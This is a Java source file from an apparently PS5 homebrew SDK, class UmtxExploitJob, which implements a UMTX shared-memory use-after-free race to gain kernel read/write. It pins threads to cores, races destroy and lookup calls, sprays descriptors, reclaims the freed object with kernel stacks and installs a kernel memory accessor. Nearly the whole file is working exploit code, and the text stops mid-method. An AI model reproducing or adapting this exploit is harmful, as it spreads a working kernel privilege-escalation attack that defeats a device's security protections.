package org.ps5jb.client.payloads.umtx.impl2;

import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

import org.ps5jb.client.PayloadConstants;
import org.ps5jb.client.payloads.umtx.common.CommandProcessor;
import org.ps5jb.client.payloads.umtx.common.DebugStatus;
import org.ps5jb.client.payloads.umtx.common.KernelAccessorSlow;
import org.ps5jb.client.payloads.umtx.common.KernelAddressClassifier;
import org.ps5jb.client.payloads.umtx.common.KernelOffsetsCalculator;
import org.ps5jb.client.payloads.umtx.common.KernelStabilizer;
import org.ps5jb.client.utils.memory.MemoryDumper;
import org.ps5jb.loader.KernelAccessor;
import org.ps5jb.loader.KernelReadWrite;
import org.ps5jb.loader.Status;
import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.sdk.core.SdkException;
import org.ps5jb.sdk.core.SdkRuntimeException;
import org.ps5jb.sdk.core.kernel.KernelAccessorIPv6;
import org.ps5jb.sdk.core.kernel.KernelPointer;
import org.ps5jb.sdk.include.PThread;
import org.ps5jb.sdk.include.PThreadNp;
import org.ps5jb.sdk.include.sys.Pipe;
import org.ps5jb.sdk.include.sys.pthreadtypes.PThreadType;
import org.ps5jb.sdk.lib.LibKernel;

/**
 * UMTX exploit from cheburek3000, adapted for this SDK:
 * https://github.com/cheburek3000/bdj-sdk/blob/umtx/samples/ps5-payload-loader/src/org/homebrew/umtx/Exploit.java
 *
 * @deprecated This implementation is deprecated as it seems to be more prone to deadlocks.
 *   There are no plans to maintain this implementation in the future and at some point it may be removed entirely.
 */
@Deprecated
public class UmtxExploitJob implements Runnable {
    private LibKernel mainLibKernel = new LibKernel();

    // Constants
    private static final int UMTX_OP_SHM = 26; // 25 on BSD
    private static final int UMTX_SHM_CREAT = 0x0001;
    private static final int UMTX_SHM_LOOKUP = 0x0002;
    private static final int UMTX_SHM_DESTROY = 0x0004;

    private static final int CPU_SETSIZE = 16;
    private static final int CPU_LEVEL_WHICH = 3;
    private static final int CPU_WHICH_TID = 1;

    private static final short RTP_PRIO_REALTIME = 2;
    private static final int RTP_SET = 1;

    private static final int OFFSET_STAT_SIZE = 0x48;

    private static final int PROT_READ = 0x1;
    private static final int PROT_WRITE = 0x2;
    private static final int MAP_SHARED = 0x1;

    // Configuration for race
    static short MAIN_THREAD_CORE = 0;
    static final short MAIN_THREAD_PRIO = 256;
    static short[] DESTROYER_THREAD_CORE = new short[] { 1, 2 };
    static final short[] DESTROYER_THREAD_PRIO = new short[] { 256, 256 };
    static short LOOKUP_THREAD_CORE = 3;
    static final short LOOKUP_THREAD_PRIO = 767;
    static short KPRIM_THREAD_CORE = -1;
    static final short KPRIM_THREAD_PRIO = 0;

    private static final int NUM_RACE_ATTEMPTS = 0x10000;
    private static int SPRAY_FDS_PER_THREAD = 0x28;

    // UMTX key area
    private Pointer shmKey;
    private Pointer fstatBuf;

    // pid for searching for this process later
    private int ourPid;

    // Current number of race attempts
    volatile int numRaceAttemts = 0;

    // Addresses mapped with mmap which may be corrupted at the end of execution
    private Set mappedKernelStackAddresses;

    // Descriptors which may be corrupted at the end of execution
    private Set usedDescriptors;

    // test pipes
    private Pointer pipeTestFds;
    private int pipeTestReadFd = -1;
    private int pipeTestWriteFd = -1;
    private Pointer pipeTestScratchBuf;

    // indicator that the job has finished running
    public volatile boolean finished = false;

    static int pinToCoreSelf(int core, LibKernel libKernel) {
        Pointer mask = Pointer.calloc(CPU_SETSIZE);
        try {
            int byteIdx = core / 8;
            int bitIdx = core % 8;
            mask.write1(byteIdx, (byte) (1 << bitIdx));
            return libKernel.cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID,
                    -1, CPU_SETSIZE, mask);
        } finally {
            mask.free();
        }
    }

    static int setRtprioSelf(short value, LibKernel libkernel) {
        Pointer prio = Pointer.calloc(0x4);
        try {
            prio.write2(RTP_PRIO_REALTIME);
            prio.write2(2, value);
            return libkernel.rtprio_thread(RTP_SET, 0, prio);
        } finally {
            prio.free();
        }
    }

    private static int UmtxShmCreate(Pointer key, LibKernel libkernel) {
        return libkernel._umtx_op(Pointer.NULL, UMTX_OP_SHM, UMTX_SHM_CREAT, key, Pointer.NULL);
    }

    private static int UmtxShmDestroy(Pointer key, LibKernel libkernel) {
        return libkernel._umtx_op(Pointer.NULL, UMTX_OP_SHM, UMTX_SHM_DESTROY, key, Pointer.NULL);
    }

    private static int UmtxShmLookup(Pointer key, LibKernel libkernel) {
        return libkernel._umtx_op(Pointer.NULL, UMTX_OP_SHM, UMTX_SHM_LOOKUP, key, Pointer.NULL);
    }

    private static int ShmResizeTag(int fd, LibKernel libkernel) {
        return libkernel.ftruncate(fd, fd * 0x4000L);
    }

    private static int ShmClose(int fd, LibKernel libkernel) {
        return libkernel.close(fd);
    }

    private int GetShmTag(int fd, LibKernel libkernel) {
        int returnCode;
        returnCode = libkernel.fstat(fd, fstatBuf);
        if (returnCode != 0) {
            return returnCode;
        }
        long tag = fstatBuf.read8(OFFSET_STAT_SIZE) / 0x4000;
        if (tag != (tag & 0x3ff)) {
            tag = fd;
        }
        return (int) tag;
    }

    public int prepare() {
        int returnCode = 0;

        // Create a UMTX key area to use, these just have to be valid pointers
        this.shmKey = Pointer.calloc(0x1000);

        // Create buffer for fstat
        this.fstatBuf = Pointer.calloc(0x100);

        // Pin main thread to core 1 with high prio
        returnCode = pinToCoreSelf(MAIN_THREAD_CORE, mainLibKernel);
        if (returnCode < 0) {
            DebugStatus.error("[-] Failed to pin main thread, returnCode: " + returnCode);
            return returnCode;
        }
        returnCode = setRtprioSelf(MAIN_THREAD_PRIO, mainLibKernel);
        if (returnCode < 0) {
            DebugStatus.error("[-] Failed to set main thread prio, returnCode: " + returnCode);
            return returnCode;
        }
        if (DebugStatus.isNoticeEnabled()) {
            DebugStatus.notice("[+] Main thread on cpu: " + mainLibKernel.sceKernelGetCurrentCpu());
        }

        // Get pid for searching for this process later
        this.ourPid = mainLibKernel.getpid();
        DebugStatus.info("[+] pid: " + this.ourPid);

        this.mappedKernelStackAddresses = new HashSet();
        this.usedDescriptors = new HashSet();

        // Create pipe for testing memory
        this.pipeTestFds = Pointer.calloc(8);
        returnCode = mainLibKernel.pipe(this.pipeTestFds);
        if (returnCode < 0) {
            DebugStatus.error("[-] Failed to create test pipe, returnCode: " + returnCode);
            return returnCode;
        }
        this.pipeTestReadFd = pipeTestFds.read4();
        this.pipeTestWriteFd = pipeTestFds.read4(4);
        this.pipeTestScratchBuf = Pointer.calloc(Pipe.BIG_PIPE_SIZE);

        kPrimPrepare();

        return 0;
    }

    public void cleanup() {
        // Cleans up all the native allocations at the end of execution
        if (shmKey != null) {
            shmKey.free();
        }

        if (fstatBuf != null) {
            fstatBuf.free();
        }

        if (pipeTestFds != null) {
            pipeTestFds.free();
        }

        if (pipeTestReadFd != -1) {
            mainLibKernel.close(pipeTestReadFd);
        }

        if (pipeTestWriteFd != -1) {
            mainLibKernel.close(pipeTestWriteFd);
        }

        if (pipeTestScratchBuf != null) {
            pipeTestScratchBuf.free();
        }
    }

    class Sychronizer {
        public AtomicBoolean runSignal;
        public AtomicBoolean resetSignal;
        public AtomicBoolean stopSignal;
        public AtomicInteger waitingReadyCounter;
        public AtomicInteger waitingStep2Counter;
        public AtomicInteger waitingResetCounter;
        private int numJobs;

        public Sychronizer(int numJobs) {
            this.numJobs = numJobs;
            runSignal = new AtomicBoolean();
            resetSignal = new AtomicBoolean();
            stopSignal = new AtomicBoolean();
            waitingReadyCounter = new AtomicInteger();
            waitingStep2Counter = new AtomicInteger();
            waitingResetCounter = new AtomicInteger();
        }

        void runWhenAllReady() {
            while (waitingReadyCounter.get() != numJobs) {
                Thread.yield();
            }
            resetSignal.set(false);
            runSignal.set(true);
        }

        void waitStep2() {
            while (waitingStep2Counter.get() != numJobs) {
                Thread.yield();
            }
        }

        void waitAllDone() {
            while (waitingResetCounter.get() != numJobs) {
                Thread.yield();
            }
        }

        void stop() {
            stopSignal.set(true);
            reset();
        }

        void reset() {
            waitingReadyCounter.set(0);
            waitingStep2Counter.set(0);
            waitingResetCounter.set(0);
            runSignal.set(false);
            resetSignal.set(true);
        }
    }

    class SynchronizedRepeatableJob implements Runnable {
        protected LibKernel libkernel;

        protected String name;
        private short core;
        private short prio;
        private Sychronizer sync;

        public SynchronizedRepeatableJob(String name, short core, short prio, Sychronizer sync) {
            this.name = name;
            this.core = core;
            this.prio = prio;
            this.sync = sync;
            this.libkernel = new LibKernel();
        }

        @Override
        public void run() {
            prepare();
            loop();
            cleanup();
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] " + this.name + ": stopped");
            }
        }

        private void prepare() {
            int returnCode;
            if (DebugStatus.isDebugEnabled()) {
                DebugStatus.debug("[+] " + this.name + ": pinning thread to " + this.core);
            }
            returnCode = pinToCoreSelf(this.core, this.libkernel);
            if (returnCode < 0) {
                DebugStatus.error("[-] " + this.name + ": failed to pin thread, returnCode: " + returnCode);
            }
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] " + this.name + ": setting prio " + this.prio);
            }
            returnCode = setRtprioSelf(this.prio, this.libkernel);
            if (returnCode < 0) {
                DebugStatus.error("[-] " + this.name + ": failed to set prio, returnCode: " + returnCode);
            }
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] " + this.name + ": prepared on cpu " + libkernel.sceKernelGetCurrentCpu());
            }
        }

        private void loop() {
            while (!sync.stopSignal.get()) {
                sync.waitingReadyCounter.incrementAndGet();
                while (!sync.runSignal.get()) {
                    Thread.yield();
                }
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] " + this.name + ": work");
                }
                work();
                sync.waitingStep2Counter.incrementAndGet();
                sync.waitStep2();
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] " + this.name + ": work2");
                }
                work2();
                sync.waitingResetCounter.incrementAndGet();
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] " + this.name + ": waiting for reset");
                }
                while (!sync.resetSignal.get()) {
                    Thread.yield();
                }
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] " + this.name + ": resetting");
                }
            }
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] " + this.name + ": finished");
            }
        }

        protected void work() {
            Thread.yield();
        }

        protected void work2() {
            Thread.yield();
        }

        protected void cleanup() {
            this.libkernel.closeLibrary();
        }
    }

    class DestroyerJob extends SynchronizedRepeatableJob {
        private AtomicInteger destructionsCounter;
        private AtomicInteger lookupFd;
        private Pointer shmKey;
        private int[] sprayFds;
        private Pointer sprayShmKey;

        public DestroyerJob(String name, short core, short prio, Sychronizer sync, AtomicInteger destructionsCounter,
                            AtomicInteger lookupFd, Pointer shmKey, Pointer sprayShmKey) {
            super(name, core, prio, sync);
            this.destructionsCounter = destructionsCounter;
            this.lookupFd = lookupFd;
            this.shmKey = shmKey;
            this.sprayFds = new int[SPRAY_FDS_PER_THREAD];
            this.sprayShmKey = sprayShmKey;
        }

        @Override
        protected void work() {
            int result = UmtxShmDestroy(shmKey, libkernel);
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("[+] " + this.name + ": destroyed, result: " + result);
            }
            if (result == 0) {
                this.destructionsCounter.incrementAndGet();
            }
        }

        @Override
        protected void work2() {
            int returnCode;
            if (destructionsCounter.get() == 2 && lookupFd.get() != -1) {
                for (int i = 0; i < SPRAY_FDS_PER_THREAD; ++i) {
                    Pointer sprayFdKey = sprayShmKey.inc(i * 0x8L);
                    sprayFds[i] = UmtxShmCreate(sprayFdKey, libkernel);
                    if (DebugStatus.isTraceEnabled()) {
                        DebugStatus.trace("[+] " + this.name + ": created " + sprayFds[i]);
                    }
                    returnCode = ShmResizeTag(sprayFds[i], libkernel);
                    if (DebugStatus.isTraceEnabled()) {
                        DebugStatus.trace("[+] " + this.name + ": resized, returnCode " + returnCode);
                    }
                    returnCode = UmtxShmDestroy(sprayFdKey, libkernel);
                    if (DebugStatus.isTraceEnabled()) {
                        DebugStatus.trace("[+] " + this.name + ": destroyed, returnCode " + returnCode);
                    }
                }
            }
        }
    }

    class LookupJob extends SynchronizedRepeatableJob {
        private AtomicInteger lookupFd;
        private Pointer shmKey;

        public LookupJob(String name, short core, short prio, Sychronizer sync, AtomicInteger lookupFd, Pointer shmKey) {
            super(name, core, prio, sync);
            this.lookupFd = lookupFd;
            this.shmKey = shmKey;
        }

        @Override
        protected void work() {
            int result = UmtxShmLookup(shmKey, libkernel);
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("[+] " + this.name + ": looked up, result: " + result);
            }
            lookupFd.set(result);
        }
    }

    public class RaceResult {
        public int returnCode;
        public int numTries;
        public int lookupFd;
        public int reclaimFd;

        public RaceResult(int returnCode) {
            this.returnCode = returnCode;
        }

        public RaceResult(int numTries, int lookupFd, int reclaimFd) {
            this.returnCode = 0;
            this.numTries = numTries;
            this.lookupFd = lookupFd;
            this.reclaimFd = reclaimFd;
        }
    }

    public RaceResult race() {
        Sychronizer destroyerLookupSync = new Sychronizer(3);
        AtomicInteger destructionsCounter = new AtomicInteger();
        AtomicInteger lookupFd = new AtomicInteger();
        int reclaimFd = -1;

        DestroyerJob[] destroyerJobs = new DestroyerJob[2];
        Thread[] destroyerThreads = new Thread[2];
        for (int i = 0; i < 2; i++) {
            destroyerJobs[i] = new DestroyerJob("destroyer[" + i + "]", DESTROYER_THREAD_CORE[i],
                    DESTROYER_THREAD_PRIO[i], destroyerLookupSync, destructionsCounter, lookupFd, this.shmKey,
                    this.shmKey.inc(0x8 * (SPRAY_FDS_PER_THREAD * i + 1)));
            destroyerThreads[i] = new Thread(destroyerJobs[i]);
        }
        for (int i = 0; i < 2; i++) {
            destroyerThreads[i].start();
        }

        LookupJob lookupJob = new LookupJob("lookup", LOOKUP_THREAD_CORE, LOOKUP_THREAD_PRIO, destroyerLookupSync,
                lookupFd, this.shmKey);
        Thread lookupThread = new Thread(lookupJob);
        lookupThread.start();
        int numDC2 = 0;
        int numSprays = 0;

        for (int attempt = 0; attempt < NUM_RACE_ATTEMPTS; ++attempt) {
            numRaceAttemts++;
            if ((numRaceAttemts % 200) == 0) {
                DebugStatus.error("[+] Race attempt " + numRaceAttemts);
            }
            // prepare
            int descriptor = UmtxShmCreate(this.shmKey, this.mainLibKernel);
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("[+] created descriptor " + descriptor);
            }
            int returnCode;
            returnCode = ShmResizeTag(descriptor, this.mainLibKernel);
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("[+] ShmResizeTag returned " + returnCode);
            }
            returnCode = ShmClose(descriptor, this.mainLibKernel);
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("[+] ShmClose returned " + returnCode);
            }

            // run
            destroyerLookupSync.runWhenAllReady();

            // check
            destroyerLookupSync.waitAllDone();
            if (destructionsCounter.get() == 2) {
                numDC2++;
                if (DebugStatus.isDebugEnabled()) {
                    DebugStatus.debug("[+] destructionsCounter: " + destructionsCounter.get());
                }
                if (lookupFd.get() != -1 && DebugStatus.isDebugEnabled()) {
                    DebugStatus.debug("[+] lookup succeeded, lookupFd: " + lookupFd.get());
                }
            } else {
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] destructionsCounter: " + destructionsCounter.get());
                }
                if (lookupFd.get() == -1) {
                    DebugStatus.trace("[-] lookup failed");
                } else if (DebugStatus.isDebugEnabled()) {
                    DebugStatus.trace("[+] lookup succeeded, lookupFd: " + lookupFd.get());
                }
            }
            if (destructionsCounter.get() == 2 && lookupFd.get() != -1) {
                numSprays++;
                DebugStatus.info("[+] destructionsCounter: " + destructionsCounter.get() + ", lookupFd: " + lookupFd.get());
                reclaimFd = GetShmTag(lookupFd.get(), mainLibKernel);
                if (DebugStatus.isDebugEnabled()) {
                    DebugStatus.debug("[+] reclaimFd: " + reclaimFd);
                }
                this.usedDescriptors.add(new Integer(lookupFd.get()));
            }
            destructionsCounter.set(0);

            for (int i = 0; i < destroyerJobs.length; ++i) {
                for (int j = 0; j < destroyerJobs[i].sprayFds.length; ++j) {
                    int sprayFd = destroyerJobs[i].sprayFds[j];
                    if (sprayFd != reclaimFd && sprayFd != -1 && sprayFd != 0) {
                        ShmClose(sprayFd, mainLibKernel);
                    }
                }
            }

            if (reclaimFd != -1 && reclaimFd != lookupFd.get()) {
                DebugStatus.info("[+] reclaimed: " + reclaimFd + " != " + lookupFd.get());
                DebugStatus.info("[+] Race succeeded, numAttempts: " + numRaceAttemts + ", numDC2: " + numDC2 + ", numSprays: " + numSprays);
                destroyerLookupSync.stop();
                return new RaceResult(attempt + 1, lookupFd.get(), reclaimFd);
            } else {
                reclaimFd = -1;
            }

            // finalize
            if (lookupFd.get() != -1 && !this.usedDescriptors.contains(new Integer(lookupFd.get()))) {
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] closing not reclaimed lookupFd: " + lookupFd);
                }
                returnCode = ShmClose(lookupFd.get(), mainLibKernel);
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] ShmClose(" + lookupFd + ") returned " + returnCode);
                }
            }
            if (attempt + 1 == NUM_RACE_ATTEMPTS) {
                destroyerLookupSync.stop();
            } else {
                destroyerLookupSync.reset();
            }
        }
        if (DebugStatus.isDebugEnabled()) {
            DebugStatus.debug("[-] Race failed, numAttemts: " + numRaceAttemts + ", numDC2: " + numDC2 + ", numSprays: " + numSprays);
        }
        return new RaceResult(-1);
    }

    private static int NUM_KPRIM_ATTEMPTS = 2;
    private static int NUM_KPRIM_THREADS = 0x100;

    class KPrimThreadData {
        public AtomicBoolean neoFound;
        public AtomicInteger neo;
        public AtomicInteger selectedOnceCounter;

        KPrimThreadData() {
            this.neoFound = new AtomicBoolean();
            this.neo = new AtomicInteger();
            this.selectedOnceCounter = new AtomicInteger();
            resetToDefaults();
        }

        public void resetToDefaults() {
            this.neoFound.set(false);
            this.neo.set(-1);
            this.selectedOnceCounter.set(0);
        }
    }

    class KPrimJob implements Runnable {
        private LibKernel libkernel;

        private int id;
        private short core;
        private short prio;
        private KPrimThreadData threadData;
        private AtomicBoolean exitSignal;
        private boolean selectedOnce;
        private boolean lastAttempt;

        private long cookie;
        private Pointer cookieBuf;
        private Pointer timeoutBuf;

        private volatile CommandProcessor commandProcessor;

        public KPrimJob(int id, short core, short prio, KPrimThreadData threadData) {
            this.id = id;
            this.core = core;
            this.prio = prio;
            this.threadData = threadData;
            this.exitSignal = new AtomicBoolean();
            cookie = (0x13370000L + id) << 32L;
            this.libkernel = new LibKernel();
            cookieBuf = Pointer.calloc(0x100);
            timeoutBuf = Pointer.calloc(0x10);
            timeoutBuf.write8(0); // tv_sec
            timeoutBuf.write8(8, 500000); // tv_usec
        }

        public void resetToDefaults(boolean lastAttempt) {
            this.exitSignal.set(false);
            this.selectedOnce = false;
            this.lastAttempt = lastAttempt;
        }

        public void signalExit() {
            this.exitSignal.set(true);
            if (commandProcessor != null) {
                commandProcessor.cmd.set(CommandProcessor.CMD_EXIT);
            }
        }

        @Override
        public void run() {
            prepare();
            loop();
            if (lastAttempt) {
                cleanup();
            }
        }

        private void prepare() {
            int returnCode;
            if (this.core >= 0) {
                if (DebugStatus.isDebugEnabled()) {
                    DebugStatus.debug("[+] kprim[" + this.id + "]: pinning thread to " + this.core);
                }
                returnCode = pinToCoreSelf(this.core, this.libkernel);
                if (returnCode < 0) {
                    DebugStatus.error("[-] kprim[" + this.id + "]: failed to pin thread, returnCode: " + returnCode);
                }
                if (DebugStatus.isNoticeEnabled()) {
                    DebugStatus.notice("[+] kprim[" + this.id + "]: prepared on cpu " + libkernel.sceKernelGetCurrentCpu());
                }
            }
            if (this.prio != 0) {
                if (DebugStatus.isNoticeEnabled()) {
                    DebugStatus.notice("[+] " + this.id + ": setting prio " + this.prio);
                }
                returnCode = setRtprioSelf(this.prio, this.libkernel);
                if (returnCode < 0) {
                    DebugStatus.error("[-] " + this.id + ": failed to set prio, returnCode: " + returnCode);
                }
            }

            // Set native thread name to find it later
            try {
                PThread pthreadLib = new PThread(libkernel);
                PThreadNp pthreadNpLib = new PThreadNp(libkernel);

                PThreadType pthread = pthreadLib.self();
                pthreadNpLib.rename(pthread, "reclaim#" + id);
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] renamed reclaim#" + id + " native thread.");
                }
            } catch (SdkException | RuntimeException | Error e) {
                DebugStatus.error("[-] failed to rename the native thread of reclaim#" + id);
            }
        }

        private void loop() {
            while (!exitSignal.get()) {
                if (threadData.neoFound.get()) {
                    if (threadData.neo.get() != id) {
                        if (DebugStatus.isDebugEnabled()) {
                            DebugStatus.debug("[+] kprim[" + this.id + "]: neo found, not me, exiting");
                        }
                        return;
                    }
                    break;
                }

                cookieBuf.write8(cookie);
                int returnCode = libkernel.select(1, cookieBuf, Pointer.NULL, Pointer.NULL, timeoutBuf);
                if (returnCode < 0) {
                    DebugStatus.error("[-] " + this.id + ": failed to select, returnCode: " + returnCode);
                }
                if (!selectedOnce) {
                    selectedOnce = true;
                    threadData.selectedOnceCounter.incrementAndGet();
                }

                Thread.yield();
            }

            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] kprim[" + this.id + "]: starting command processor");
            }
            commandProcessor = new CommandProcessor();
            commandProcessor.handleCommands();

            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] kprim[" + this.id + "]: finished");
            }
        }

        private void cleanup() {
            if (cookieBuf != null) {
                cookieBuf.free();
            }

            if (timeoutBuf != null) {
                timeoutBuf.free();
            }

            libkernel.closeLibrary();
        }
    }

    private KPrimThreadData kPrimThreadData;
    private KPrimJob[] kPrimJobs;
    private Thread[] kPrimThreads;

    private void kPrimPrepare() {
        kPrimThreadData = new KPrimThreadData();
        kPrimJobs = new KPrimJob[NUM_KPRIM_THREADS];
        kPrimThreads = new Thread[NUM_KPRIM_THREADS];
        for (int i = 0; i < NUM_KPRIM_THREADS; ++i) {
            kPrimJobs[i] = new KPrimJob(i, KPRIM_THREAD_CORE, KPRIM_THREAD_PRIO, kPrimThreadData);
        }
    }

    public static class RWResult {
        public int returnCode;

        public RWResult(int returnCode) {
            this.returnCode = returnCode;
        }
    }

    private boolean isMemoryReadable(Pointer kstack, LibKernel libkernel) {
        long returnCode = libkernel.write(this.pipeTestWriteFd, kstack, 1);
        if (returnCode < 0) {
            DebugStatus.error("[-] isMemoryReadable: failed to read from mem, errno: " + libkernel.__error().read4());
            return false;
        }
        returnCode = libkernel.read(this.pipeTestReadFd, this.pipeTestScratchBuf, returnCode);
        if (returnCode < 0) {
            DebugStatus.error("[-] isMemoryReadable: failed to read from pipe, errno: " + libkernel.__error().read4());
        }
        return true;
    }

    private void stopBadKprimThreads(int neo) {
        if (DebugStatus.isNoticeEnabled()) {
            DebugStatus.notice("[+] stopping kprim threads except " + neo);
        }
        kPrimThreadData.neo.set(neo);
        kPrimThreadData.neoFound.set(true);

        for (int i = 0; i < NUM_KPRIM_THREADS; ++i) {
            if (i != neo) {
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] stopping kprim[" + i + "]");
                }
                try {
                    kPrimThreads[i].join();
                } catch (InterruptedException e) {
                    DebugStatus.error("[-] stopping kprim[" + i + "] failed");
                }
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] stopped kprim[" + i + "]");
                }
            } else {
                if (DebugStatus.isDebugEnabled()) {
                    DebugStatus.debug("[+] waiting for command processor to start");
                }
                while (kPrimJobs[i].commandProcessor == null) {
                    Thread.yield();
                }
            }
        }
        if (DebugStatus.isNoticeEnabled()) {
            DebugStatus.notice("[+] kprim threads stopped");
        }
    }

    public RWResult getRW(int lookupFd, int reclaimFd) {
        int returnCode;

        // We have 2 fd referencing a shmfd which will be free'd if we close 1 fd...do that
        returnCode = ShmClose(reclaimFd, this.mainLibKernel);
        if (DebugStatus.isNoticeEnabled()) {
            DebugStatus.notice("[+] Closed reclaimFd, returnCode: " + returnCode);
        }

        // mmap using the remaining fd to reference the free'd but still initialized vmobject.
        Pointer kstack = this.mainLibKernel.mmap(Pointer.NULL, 0x4000, PROT_READ | PROT_WRITE,
                MAP_SHARED, lookupFd, 0);
        if (kstack.addr() < 0) {
            DebugStatus.error("[-] Unable to mmap lookupFd, kstack: " + kstack);
            return new RWResult(-1);
        }
        DebugStatus.info("[+] kstack: " + kstack);

        int neo = -1;

        for (int attempt = 0; attempt < NUM_KPRIM_ATTEMPTS; ++attempt) {
            boolean lastAttempt = (attempt + 1) == NUM_KPRIM_ATTEMPTS;
            kPrimThreadData.resetToDefaults();
            for (int i = 0; i < NUM_KPRIM_THREADS; ++i) {
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] Starting kPrimThread[" + i + "]");
                }
                kPrimJobs[i].resetToDefaults(lastAttempt);
                kPrimThreads[i] = new Thread(kPrimJobs[i]);
                kPrimThreads[i].start();
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] Started kPrimThread[" + i + "]");
                }
            }
            DebugStatus.info("[+] Started kprim threads. Attempt " + (attempt + 1) + " of " + NUM_KPRIM_ATTEMPTS);

            boolean kstackValid = false;

            while (kPrimThreadData.selectedOnceCounter.get() < NUM_KPRIM_THREADS) {
                mainLibKernel.usleep(500000);
                DebugStatus.info("[+] Waiting for all threads to work at least once, current count: "
                        + kPrimThreadData.selectedOnceCounter.get());
            }

            DebugStatus.info("[+] Checking kstack memory to be readable");
            if (!isMemoryReadable(kstack, this.mainLibKernel)) {
                // TODO: debug
                if (lastAttempt) {
                    DebugStatus.info("[-] Memory still is not readable, unmapping");
                    if (mainLibKernel.munmap(kstack, 0x4000) == -1) {
                        DebugStatus.error("[-] Failed to unmap memory after failure");
                    } else {
                        kstack = Pointer.NULL;
                    }
                } else {
                    DebugStatus.info("[+] Memory is not readable, trying again");
                }
                stopBadKprimThreads(-1);
                continue;
            }

            DebugStatus.info("[+] Checking kstack is not zeros");
            for (int i = 0; i < 0x1000; i += 0x8) {
                long test_qword = kstack.read8(0x3000 + i);
                if (test_qword != 0) {
                    kstackValid = true;
                    break;
                }
            }

            if (!kstackValid) {
                DebugStatus.info("[-] Failed to reclaim with kernel stack, trying again");
                stopBadKprimThreads(-1);
                continue;
            }

            DebugStatus.info("[+] kernel stack dump:");
            MemoryDumper.dump(kstack.inc(0x3000), 0x1000L, true);

            DebugStatus.info("[+] looking for cookie");
            for (int i = 0x3002; i < 0x4000; i += 0x2) {
                short dword = kstack.read2(i);
                if (dword == ((short) 0x1337)) {
                    DebugStatus.info("[+] cookie found at 0x" + Long.toHexString(i));
                    neo = kstack.read2(i - 2);
                    DebugStatus.info("[+] reclaim thread index " + neo);

                    // Webkit implementation uses fixed offset from the cookie
                    // to get the thread. It's probably specific to sched_yield method.
                    // This implementation does not rely on this method but printing
                    // one candidate to compare if it's still fixed.
                    final long potentialThreadOffset = i - 2 + 0x124;
                    if (potentialThreadOffset + 8 <= 0x4000) {
                        KernelPointer threadPtr = KernelPointer.valueOf(kstack.read8(potentialThreadOffset));
                        DebugStatus.info("[+] possible thread pointer: " + threadPtr);
                    }
                    break;
                }
            }
            break;
        }

        stopBadKprimThreads(neo);

        if (neo == -1) {
            DebugStatus.info("[-] Failed to reclaim with kernel stack, halting this race attempt");
        } else {
            try {
                KernelReadWrite.setAccessor(new KernelAccessorSlow(kPrimJobs[neo].commandProcessor, kstack));
            } catch (Exception e) {
                // Accessor could not be created, attempt to stop reclaim thread
                neo = -1;
                stopBadKprimThreads(-1);
            }
        }

        if (!Pointer.NULL.equals(kstack) && (neo == -1)) {
            this.mappedKernelStackAddresses.add(kstack);
        }

        return new RWResult(neo);
    }

    protected boolean calculateKernelOffsets(int swVer, KernelOffsetsCalculator calculator, Pointer kstack) {
        KernelAddressClassifier classifier = KernelAddressClassifier.fromBuffer(new Pointer(kstack.addr() + 0x3000, new Long(0x1000L)));
        return calculator.calculate(swVer, classifier, "reclaim#" + kPrimThreadData.neo.get());
    }

    protected void stabilize(KernelOffsetsCalculator offsets, int lookupFd) throws SdkException {
        KernelStabilizer stabilizer = new KernelStabilizer();
        stabilizer.fixupKernelStack(offsets.threadAddress);
        DebugStatus.info("[+] kstack stabilized");

        int closeRet = stabilizer.fixupSharedMemory(offsets.processOpenFilesAddress, lookupFd);
        DebugStatus.info("[+] open files stabilized; lookup fd close=" + closeRet);

        if (!usedDescriptors.isEmpty()) {
            usedDescriptors.remove(new Integer(lookupFd));
            int fixCount = stabilizer.fixUsedDescriptors(offsets.processOpenFilesAddress, usedDescriptors);
            if (fixCount > 0) {
                DebugStatus.info("[+] found " + fixCount + " lingering shm descriptors");
            }
        }

        // This does not seem necessary because the exploit is triggered fast enough that there are no lingering mappings
        if (!mappedKernelStackAddresses.isEmpty()) {
            int numFixes = stabilizer.fixupVmSpace(offsets.processAddress, mappedKernelStackAddresses);
            if (numFixes > 0) {
                DebugStatus.info("[+] vm space stabilized; fixed " + numFixes + " entries");
            }
        }
    }

    public void postExploit(int lookupFd, int neo) {
        // Slow kernel accessor installed, upgrade to a faster one
        KernelAccessor kernelAccessor = KernelReadWrite.getAccessor(getClass().getClassLoader());
        if (kernelAccessor instanceof KernelAccessorSlow) {
            KernelAccessorSlow kaSlow = (KernelAccessorSlow) kernelAccessor;
            try {
                KernelOffsetsCalculator offsets = new KernelOffsetsCalculator();

                int swVer = mainLibKernel.getSystemSoftwareVersion();
                if (calculateKernelOffsets(swVer, offsets, kaSlow.getKstack())) {
                    try {
                        if (!KernelPointer.NULL.equals(offsets.processOpenFilesAddress)) {
